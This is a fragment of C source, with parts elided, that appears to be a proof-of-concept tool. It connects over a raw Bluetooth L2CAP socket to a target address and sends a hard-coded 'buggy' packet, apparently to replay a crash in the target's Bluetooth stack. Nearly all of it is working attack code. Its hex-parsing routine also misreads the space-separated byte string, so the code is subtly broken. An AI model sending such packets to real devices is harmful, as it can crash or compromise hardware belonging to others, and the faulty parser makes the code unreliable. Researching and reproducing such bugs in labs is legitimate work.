...
void hexstring_to_bytes(const char *hexstring, char *bytes, int bytes_len) {
    int i, j;

    for (i = 0, j = 0; i < bytes_len; i++, j += 2) {
        sscanf(hexstring + j, "%2hhx", &bytes[i]);
    }
}

void set_replay_buggy_packet(const char *hex_data) {
    hexstring_to_bytes(hex_data, replay_buggy_packet, SIZE);
}

...

int main(int argc, char **argv) {
    ...

    if (argc < 2) {
        fprintf(stderr, "Usage: %s bluetooth_address\n", argv[0]);
        exit(EXIT_FAILURE);
    }
	
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &addr.l2_bdaddr);
	
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }
	
    set_replay_buggy_packet("B1 01 DB 69 94 5C 07 4E 0D 9B 2E F1");

    if ((sent = send(sock, replay_buggy_packet, SIZE, 0)) >= 0) {
        printf("L2CAP packet sent (%d)\n", sent);
    }

    printf("Buffer:\t");
    for (i = 0; i < sent; i++) {
        printf("%.2X ", (unsigned char) replay_buggy_packet[i]);
    }
    printf("\n");

    close(sock);
    return EXIT_SUCCESS;
}
